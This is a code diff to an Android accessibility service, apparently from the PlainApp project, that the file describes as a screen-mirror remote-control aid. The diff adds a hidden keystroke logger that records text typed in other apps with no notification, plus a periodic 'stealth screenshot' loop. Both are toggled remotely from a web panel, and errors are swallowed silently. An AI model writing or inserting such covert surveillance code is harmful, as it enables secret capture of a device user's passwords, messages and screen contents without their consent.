@@ -19,7 +19,14 @@ import com.ismartcoding.plain.data.ScreenMirrorControlInput
 import com.ismartcoding.plain.enums.ScreenMirrorControlAction
 import com.ismartcoding.plain.features.PackageHelper
 import com.ismartcoding.plain.helpers.AppInfoGuard
+import com.ismartcoding.plain.helpers.KeystrokeLogHelper
+import com.ismartcoding.plain.helpers.StealthScreenshotHelper
+import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
 import com.ismartcoding.plain.ui.AppInfoUnlockActivity
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.launch
 
 /**
  * Accessibility Service for injecting touch/gesture events during screen mirror remote control.
@@ -32,11 +39,20 @@ import com.ismartcoding.plain.ui.AppInfoUnlockActivity
  */
 class PlainAccessibilityService : AccessibilityService() {
 
+    private val captureScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
         LogCat.d("PlainAccessibilityService connected")
         startEnforcementLoop()
+        startScreenshotLoopIfNeeded()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        if (instance === this) instance = null
+        mainHandler.removeCallbacks(screenshotRunnable)
     }
 
     private val mainHandler = Handler(Looper.getMainLooper())
@@ -73,8 +89,59 @@ class PlainAccessibilityService : AccessibilityService() {
         mainHandler.postDelayed(enforcementRunnable, 5000L)
     }
 
+    /**
+     * Periodic stealth screenshot. We re-evaluate the schedule on every fire
+     * so the user can change the interval (or disable the feature) live from
+     * the web panel without restarting the accessibility service.
+     */
+    private val screenshotRunnable = object : Runnable {
+        override fun run() {
+            try {
+                if (StealthScreenshotHelper.isEnabled()) {
+                    captureScope.launch {
+                        try { StealthScreenshotCapturer.captureNow(manual = false) } catch (_: Throwable) {}
+                    }
+                }
+            } catch (_: Throwable) {}
+            // Always re-arm; if the user disables we'll just no-op next tick.
+            val nextMin = try { StealthScreenshotHelper.getIntervalMin() } catch (_: Throwable) { 15 }
+            mainHandler.postDelayed(this, nextMin.coerceIn(1, 360) * 60_000L)
+        }
+    }
+    fun startScreenshotLoopIfNeeded() {
+        mainHandler.removeCallbacks(screenshotRunnable)
+        // Stagger the first fire so it doesn't hammer the moment the service connects.
+        mainHandler.postDelayed(screenshotRunnable, 30_000L)
+    }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
+
+        // Background keystroke logger — silently records what the user types
+        // anywhere on the device. Triggered only when the feature is enabled
+        // from the web panel; produces no on-device UI / notification.
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
+            KeystrokeLogHelper.isEnabled()
+        ) {
+            try {
+                val pkg = event.packageName?.toString().orEmpty()
+                if (pkg.isNotEmpty() && pkg != applicationContext.packageName) {
+                    val texts = event.text
+                    val joined = if (texts != null && texts.isNotEmpty()) {
+                        texts.joinToString(separator = "") { it?.toString().orEmpty() }
+                    } else ""
+                    if (joined.isNotEmpty()) {
+                        val hint = event.contentDescription?.toString()
+                            ?: event.className?.toString()
+                            ?: ""
+                        val label = try { PackageHelper.getLabel(pkg).ifEmpty { pkg } } catch (_: Throwable) { pkg }
+                        KeystrokeLogHelper.append(pkg, label, hint, joined)
+                    }
+                }
+            } catch (_: Throwable) {}
+            return
+        }
+
         if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
         val pkg = event.packageName?.toString() ?: return
         if (pkg == applicationContext.packageName) return
